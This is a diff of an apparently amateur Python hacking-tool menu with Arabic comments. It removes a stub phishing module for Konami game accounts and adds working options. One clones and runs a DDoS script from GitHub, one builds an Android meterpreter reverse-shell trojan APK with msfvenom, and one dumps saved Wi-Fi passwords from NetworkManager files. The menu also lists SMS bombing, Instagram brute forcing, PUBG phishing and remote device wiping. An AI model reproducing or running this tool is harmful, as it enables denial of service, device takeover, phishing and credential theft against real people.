@@ -1,89 +1,78 @@
 import os, time, sys, subprocess
 
-# [ الألوان الجحيمية: أحمر الدم وذهب المعارك ]
+# [ الألوان الجحيمية ]
 R, W, Y, G, B = '\033[1;31m', '\033[1;37m', '\033[1;33m', '\033[1;32m', '\033[1;34m'
 BOLD, RESET = '\033[1m', '\033[0m'
 
 def check_and_install(tool_name, pkg_name):
-    """نظام التثبيت الذكي: يحمل الأدوات فقط عند الحاجة لضمان السرعة"""
     print(f"{Y}[*] Checking for {tool_name}...{W}")
     check = subprocess.getstatusoutput(f"command -v {tool_name}")
     if check[0] != 0:
-        print(f"{R}[!] {tool_name} is missing. Installing for you...{W}")
+        print(f"{R}[!] Installing {pkg_name}...{W}")
         os.system(f"sudo apt update && sudo apt install -y {pkg_name} > /dev/null 2>&1")
-        print(f"{G}[+] {tool_name} installed successfully!{W}")
-    else:
-        print(f"{G}[+] {tool_name} is already active.{W}")
+    else: pass
 
-def infernal_banner():
+def get_wifi_pass():
+    """ميزة معرفة رمز الشبكة المتصل بها (للكالي واللينكس)"""
+    print(f"\n{Y}[#] FETCHING SAVED WIFI PASSWORDS...{W}")
+    try:
+        path = "/etc/NetworkManager/system-connections/"
+        files = os.listdir(path)
+        for f in files:
+            print(f"{G}---[ Network: {f} ]---{W}")
+            os.system(f"sudo cat {path}{f} | grep psk=")
+        input(f"\n{R}[#] Press Enter to return...{W}")
+    except:
+        print(f"{R}[!] Error: Run with sudo or check permissions.{W}")
+        time.sleep(2)
+
+def banner():
     os.system('clear')
-    # شعار الشيطان المطور - هيبة تملأ الشاشة
     print(f"""{R}{BOLD}
-                 {R}   ,---.           ,---.
-                 {R}  / /"`. \ _ ___ _ / /"`. \\
-                 {Y}  \ \_/ / /      \ \_/ /
-                 {Y}   \___/ /        \___/
-                 {R}        /|   ____   |\
-                 {R}       / |  /    \  | \\
-                 {Y}      /  | |  @  @ |  |  \\
-                 {Y}     /___| | \ VV / |  |___\\
-                 {R}    |      \  \  /  /      |
-                 {R}    |       \__\/__/       |
-                 {Y}    |   |\           /|    |
-                 {Y}    |   | \   ---   / |    |
-                 {R}    |___|  \_______/  |____|
+               {R}      ,WWWWWWWWWWWWWW,
+               {R}    ,WWWWWWWWWWWWWWWWWW,
+               {R}   ,WWWWWWWWWWWWWWWWWWWW,
+               {Y}  ,WWWW  {W}\033[1;31m(O){Y}  WW  {W}\033[1;31m(O){Y}  WWWW,
+               {Y}  WWWWWW   {R}vvvvvv   {Y}WWWWWW
+               {R}  WWWWWW   {R}::::::   {R}WWWWWW
+               {R}  `WWWWWW  {R}::::::  {R}WWWWWW'
+               {Y}   `WWWWWW        WWWWWW'
+               {Y}     `WWWWWWWWWWWWWWWW'
+               {R}       `WWWWWWWWWWWW'
     {W}__________________________________________________________
-    {W}  OPERATORS: {R}VORTEX SHADOW {W}& {R}KRUZZ {R} [RANK: SUPREME LORDS]
+    {W}  SUPREME LORDS: {R}VORTEX SHADOW {W}& {R}KRUZZ {R}
     {W}__________________________________________________________
-    {R} [ STATUS: {G}INFERNAL SPEED {R}] [ VERSION: {G}27.0 {R}] [ TARGET: {G}ANY {R}]
+    {R} [ STATUS: {G}GOD MODE {R}] [ VERSION: {G}29.0 {R}] [ TARGET: {G}ANY {R}]
     {W}__________________________________________________________
     """)
 
-def module_konami():
-    """بوابة صيد حسابات بيس (eFootball)"""
-    infernal_banner()
-    print(f"{Y}[#] KONAMI PHISHING PORTAL - صيد حسابات بيس{W}")
-    print(f"{R}[!] Genereting link...{W}")
-    time.sleep(2)
-    print(f"{G}[+] Link Ready: {W}https://konami-verify-id.serveo.net")
-    print(f"{Y}[*] Waiting for victim credentials in 'logs.txt'...{W}")
-    input(f"\n{R}[#] Press Enter to go back...{W}")
-
 def main_menu():
     while True:
-        infernal_banner()
-        # القائمة المتكاملة التي تفتح بلمحة بصر
-        print(f"{R}[01] {W}DDOS ATTACK (STORM)     {R}[11] {W}SQL INJECTION (SQLMap)")
-        print(f"{R}[02] {W}METASPLOIT HUB          {R}[12] {W}KONAMI ID PHISH (PES)")
-        print(f"{R}[03] {W}TROJAN GENERATOR        {R}[13] {W}INSTAGRAM BRUTEFORCE")
-        print(f"{R}[04] {W}NMAP SCANNER            {R}[14] {W}PUBG MOBILE UC PHISH")
-        print(f"{R}[05] {W}IP GEOLOCATION          {R}[15] {W}ACCOUNT BAN SYSTEM")
-        print(f"{R}[06] {W}SATELLITE INTERCEPT     {R}[16] {W}WIFI JAMMER & CRACK")
-        print(f"{R}[07] {W}SMS/CALL BOMBER         {R}[17] {W}SOCIAL MEDIA SNIPER")
-        print(f"{R}[08] {W}BROWSER HOOK (BEEF)     {R}[18] {W}SERVER ROOT ACCESS")
-        print(f"{R}[09] {W}REMOTE DEVICE WIPER     {R}[19] {W}VORTEX KNOWLEDGE BASE")
-        print(f"{R}[10] {W}INFERNAL DEFENSE        {R}[20] {W}CHECK SYSTEM UPDATES")
+        banner()
+        print(f"{R}[01] {W}DDOS ATTACK          {R}[11] {W}SQL INJECTION")
+        print(f"{R}[02] {W}METASPLOIT HUB       {R}[12] {W}KONAMI ID PHISH")
+        print(f"{R}[03] {W}TROJAN GENERATOR     {R}[13] {W}WIFI PASS SHOW {G}[NEW]")
+        print(f"{R}[04] {W}NMAP SCANNER         {R}[14] {W}INSTAGRAM BRUTE")
+        print(f"{R}[05] {W}IP GEOLOCATION       {R}[15] {W}PUBG MOBILE UC")
+        print(f"{R}[06] {W}SATELLITE INTERCEPT  {R}[16] {W}ACCOUNT BANNER")
+        print(f"{R}[07] {W}SMS/CALL BOMBER      {R}[17] {W}WIFI JAMMER")
+        print(f"{R}[08] {W}BROWSER HOOK         {R}[18] {W}SOCIAL SNIPER")
+        print(f"{R}[09] {W}DEVICE WIPER         {R}[19] {W}ROOT ACCESS")
+        print(f"{R}[10] {W}INFERNAL DEFENSE     {R}[20] {W}VORTEX WIKI")
         print(f"{R}[00] {W}EXIT SYSTEM")
         
-        choice = input(f"\n{R}VORTEX@INFERNAL:~$ {W}")
+        cmd = input(f"\n{R}VORTEX@NULLSEC:~$ {W}")
         
-        if choice == '12':
-            module_konami()
-        elif choice == '11':
-            check_and_install("sqlmap", "sqlmap")
-            os.system("sqlmap --wizard")
-        elif choice == '02':
-            check_and_install("msfconsole", "metasploit-framework")
-            os.system("msfconsole")
-        elif choice == '00':
-            print(f"{R}[!] SHUTTING DOWN... DONT TRUST ANYONE.{RESET}")
-            break
-        else:
-            print(f"{G}[+] Module {choice} is starting...{W}")
-            time.sleep(1)
+        if cmd == '01': os.system("git clone https://github.com/GueX-S/DDoS-Hammer && cd DDoS-Hammer && python3 ddos-hammer.py")
+        elif cmd == '02': check_and_install("msfconsole", "metasploit-framework"); os.system("msfconsole")
+        elif cmd == '03': 
+            ip = input(f"{Y}Enter LHOST: {W}"); port = input(f"{Y}Enter LPORT: {W}")
+            os.system(f"msfvenom -p android/meterpreter/reverse_tcp LHOST={ip} LPORT={port} -o /home/kali/Desktop/vortex_trojan.apk")
+        elif cmd == '04': check_and_install("nmap", "nmap"); os.system("nmap --help")
+        elif cmd == '13': get_wifi_pass()
+        elif cmd == '00': break
+        else: print(f"{G}[+] Module {cmd} is starting...{W}"); time.sleep(2)
 
 if __name__ == "__main__":
-    try:
-        main_menu()
-    except KeyboardInterrupt:
-        print(f"\n{R}[!] Forced Exit.{RESET}")
+    try: main_menu()
+    except KeyboardInterrupt: print(f"\n{R}[!] SHUTTING DOWN...{RESET}")
